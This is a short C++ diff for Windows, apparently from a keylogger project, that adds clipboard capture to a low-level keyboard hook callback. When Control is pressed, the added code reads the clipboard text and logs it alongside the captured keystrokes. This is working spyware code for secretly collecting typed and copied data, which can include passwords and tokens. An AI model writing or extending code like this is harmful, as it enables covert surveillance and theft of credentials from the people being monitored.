@@ -38,6 +38,23 @@ LRESULT CALLBACK KeyboardCallback(const int nCode, const WPARAM wParam, const WP
         std::string final;
         addCombinationModifier(&final);
 
+        if (checkModifierStatus(VK_CONTROL)) {
+            OpenClipboard(nullptr);
+
+            const auto cbHandle = GetClipboardData(CF_TEXT);
+
+            const char* cbHandleText = static_cast<char*>(GlobalLock(cbHandle));
+            const std::string text(cbHandleText);
+            printf("Clipboard: %s\n", text.c_str());
+
+            GlobalUnlock(cbHandle);
+            CloseClipboard();
+
+            std::string cbTextFinal = "Clipboard: " + text;
+
+            EventLogger::getInstance().logEvent(cbTextFinal);
+        }
+
         if (scanCodeMapFI.contains(kbStruct->scanCode)) {
             final += scanCodeMapFI[kbStruct->scanCode];
         }
